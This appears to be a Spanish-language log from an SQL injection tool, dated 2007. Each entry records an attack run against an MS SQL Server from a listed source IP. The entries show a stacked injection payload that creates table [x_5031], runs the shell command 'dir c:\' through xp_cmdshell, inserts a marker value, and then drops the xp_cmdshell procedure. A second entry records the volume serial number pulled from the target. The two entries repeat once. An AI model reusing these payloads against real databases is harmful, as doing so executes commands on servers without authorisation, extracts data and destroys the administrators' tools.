----------------------------------------------------------------
Accion:.............Comando: creacion de tabla y ejecucion de comando shell con insercion de datos..
Origen:.............110.21.13.1.
Fecha:..............2007-08-04.
Hora:...............22:07:36.
Resultado: se ha creado la tabla:[x_5031].
Resultado: se ha ejecutado el comando de shell: 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............110.21.13.1.
Fecha:..............2007-08-04.
Hora:...............22:07:39.
Datos:.............._volume_serial_number_is_24ca-c152|.

----------------------------------------------------------------
Accion:.............Comando: creacion de tabla y ejecucion de comando shell con insercion de datos..
Origen:.............110.21.13.1.
Fecha:..............2007-08-04.
Hora:...............22:07:36.
Resultado: se ha creado la tabla:[x_5031].
Resultado: se ha ejecutado el comando de shell: 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............110.21.13.1.
Fecha:..............2007-08-04.
Hora:...............22:07:39.
Datos:.............._volume_serial_number_is_24ca-c152|.

